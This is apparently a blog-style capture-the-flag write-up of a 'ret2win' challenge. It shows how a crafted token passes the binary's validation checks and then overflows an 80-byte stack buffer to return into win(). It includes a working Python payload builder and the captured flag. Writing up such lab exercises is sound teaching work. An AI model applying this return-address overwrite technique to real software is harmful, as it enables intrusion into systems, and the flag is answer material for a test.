---
title: "1337 Local CTF: ret2win — Token Validation → Return Address Control"
published: 2026-06-27
description: "Building a valid token, overflowing an 80-byte stack buffer, and returning into win()."
tags: [1337CTF, CTF, Pwn, BufferOverflow, ret2win]
category: CTF
image: ./cover.png
draft: false
---

# ret2win

## Challenge Context

The binary accepted a token, validated fields inside it, then read enough data into a fixed-size stack buffer to overwrite the saved return address.

## Reconnaissance

The exploit notes identified:

```text
buffer size: 0x50 bytes
saved RBP:   8 bytes
offset to RIP: 88 bytes
win():       0x401406
```

The token also had structural checks:

```text
[0-3]   uint32 magic = 0xdeadc0de
[4]     byte = 0x41
[7-10]  uint32 xor = 0xdeadc0de ^ 0x41
[11-22] "moul_cyber\x00\x00"
[23-26] current timestamp
```

## Vulnerability / Core Idea

The program combined input validation with an unsafe stack copy. A valid token got past the checks, but the same input could continue past the buffer and control RIP.

## Exploitation

The payload layout:

```text
valid token fields
padding up to 88 bytes
win() address as little-endian QWORD
```

```python
import struct, time

WIN = 0x401406
OFFSET = 88
payload  = struct.pack('<I', 0xdeadc0de)
payload += b'\x41'
payload += b'\x00\x00'
payload += struct.pack('<I', 0xdeadc0de ^ 0x41)
payload += b'moul_cyber\x00\x00'
payload += struct.pack('<I', int(time.time()))
payload += b'\x00\x00\x00'
payload += b'B' * (OFFSET - len(payload))
payload += struct.pack('<Q', WIN)
```

The delegate notes also mention a stack-alignment variant that jumps to `win+1` (`0x401407`) to skip `push rbp` if needed.

## Flag

```text
leet{6H4_8CHW1Y4_311K_M41K_Z3r84N}
```

## Lesson Learned

Passing validation is not enough to make input safe. If the copy into the destination buffer is still unbounded, the validated token becomes the prefix of an exploit payload.

---

Cover: [Wallhaven 5y7e99](https://wallhaven.cc/w/5y7e99).
